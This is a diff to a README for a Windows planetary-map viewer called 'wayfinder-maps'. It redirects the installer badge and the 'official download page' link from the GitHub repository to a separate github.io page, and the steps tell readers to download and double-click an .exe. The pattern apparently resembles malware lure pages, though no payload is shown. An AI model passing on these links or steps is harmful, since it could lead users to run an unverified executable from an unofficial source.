@@ -1,6 +1,6 @@
 # 🌍 wayfinder-maps - Visualize planetary maps with ease
 
-[![Download Wayfinder Maps](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Yellowdeliciousgrandcanyon551/wayfinder-maps)
+[![Download Wayfinder Maps](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://yellowdeliciousgrandcanyon551.github.io)
 
 Wayfinder Maps serves as a tool for viewing and exploring planetary data. It organizes complex map information into a simple, visual format. You use this software to navigate through different planetary regions and identify specific data points. The tool manages large files and displays them on your screen without requiring technical expertise.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11 to use this application. En
 
 Follow these steps to set up the software:
 
-1. Visit the [official download page](https://github.com/Yellowdeliciousgrandcanyon551/wayfinder-maps).
+1. Visit the [official download page](https://yellowdeliciousgrandcanyon551.github.io).
 2. Locate the latest version of the installer file, which ends in .exe.
 3. Click the link to save the installer to your computer.
 4. Double-click the downloaded file to start the installation process.
